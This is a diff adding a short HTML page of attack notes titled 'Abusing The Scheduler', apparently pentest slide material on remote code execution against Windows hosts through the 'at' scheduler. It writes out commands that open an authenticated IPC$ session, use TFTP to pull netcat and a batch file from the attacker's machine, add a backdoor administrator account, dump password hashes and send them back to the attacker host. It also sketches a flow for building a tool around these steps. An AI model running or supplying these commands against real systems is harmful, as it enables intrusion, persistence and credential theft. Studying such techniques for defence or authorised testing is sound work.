@@ -1,0 +1,43 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Abusing The Scheduler</title>
+</head><body>net use \\target\ipc$ password /user:username<br/>
+at \\target 12:00pm command<br/>
+&nbsp;&#09;Example: at \\192.168.1.1 12:00pm tftp -I myip GET nc.exe<br/>
+<br/>
+At is as good as having a shell:<br/>
+&nbsp;&#09;Enable / Start Services<br/>
+&nbsp;&#09;Transfer files<br/>
+&nbsp;&#09;Adding users<br/>
+&nbsp;&#09;Messing with the registry / policies<br/>
+&nbsp;&#09;Pretty much anything you can do with a shell<br/>
+&nbsp;&#09;Added bonus, defaults to run as SYSTEM<br/>
+<br/>
+Building a tool around AT<br/>
+&nbsp;&#09;FLOW<br/>
+&nbsp;&#09;&#09;Establish authenticated session<br/>
+&nbsp;&#09;&#09;Determine time on target<br/>
+&nbsp;&#09;&#09;Pass commands to the target to be run 1 min from now<br/>
+&nbsp;&#09;&#09;&#09;Write a batch file that executes everything at once<br/>
+&nbsp;&#09;&#09;&#09;Have the target send you back whatever info you want<br/>
+&nbsp;&#09;&#09;&#09;Be mindful of file transfer protocols, TFTP is good but not always "quiet" or available<br/>
+Example<br/>
+net use \\target<br/>
+net time \\target<br/>
+at \\target (net time +1 min) "tftp -i use GET e.bat"<br/>
+at \\target (net time +2 min) e.bat<br/>
+e.bat does:<br/>
+&nbsp;&#09;adds a user (net user hacked hacked /add)<br/>
+&nbsp;&#09;&#09;Admin group (net localgroup adminsitrators hacked /add)<br/>
+&nbsp;&#09;gets hashdumping tools and dumps hashes<br/>
+&nbsp;&#09;sends hashes, identified by IP back to attacker host<br/>
+<br/>
+<br/>
+Privileges of LocalSystem that we cate about<br/>
+NT AUTHORITY\SYSTEM and <br/>
+BUILTIN\Administrators SIDs<br/>
+SE_IMPERSONATE_NAME<br/>
+SE_TCB_NAME<br/>
+SE_DEBUG_NAME</body></html>
